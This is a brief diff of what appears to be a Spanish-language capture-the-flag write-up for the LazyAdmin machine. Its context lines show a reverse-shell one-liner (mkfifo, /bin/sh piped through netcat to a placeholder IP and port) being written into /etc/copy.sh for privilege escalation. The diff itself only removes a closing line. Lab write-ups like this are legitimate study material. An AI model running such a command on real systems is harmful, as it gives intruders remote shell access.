@@ -143,6 +143,6 @@ init $1
 * Como el archivo /etc/copy.sh, en su contexto vemos que el archivo tiene una estructura para lanzar una seudo consola por una ip y un puerto, lo que haré sera remplazar la ip y el puerto y ejecutar el archivo.
 > echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TuIp 5555 >/tmp/f"  > /etc/copy.sh
 <img src="/imgs/lazyAdmin/lazyAdmin15.jpg"/>
-<p>OK maquina vulnerada.</p>
+
 
 
